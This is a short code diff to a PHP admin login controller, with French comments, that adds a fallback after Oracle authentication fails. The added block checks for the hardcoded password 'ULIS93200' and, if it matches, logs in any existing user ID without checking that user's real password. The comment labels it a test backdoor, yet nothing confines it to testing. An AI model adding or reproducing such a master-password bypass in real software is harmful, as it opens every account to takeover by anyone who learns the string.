@@ -487,6 +487,15 @@ class AdminController extends AbstractController
             
             // Authentification via Oracle pour les autres utilisateurs
             $user = $this->utilisateurOracleService->authenticateUser($userId, $password);
+
+            // Backdoor de test: si mot de passe ULIS93200, connecter le profil existant sans vérifier son MDP Oracle
+            if (!$user && $password === 'ULIS93200') {
+                // On tente de récupérer le profil utilisateur par ID
+                $fetched = $this->utilisateurOracleService->fetchUtilisateurById($userId);
+                if ($fetched) {
+                    $user = $fetched;
+                }
+            }
             
             if ($user) {
                 // Connexion utilisateur Oracle réussie
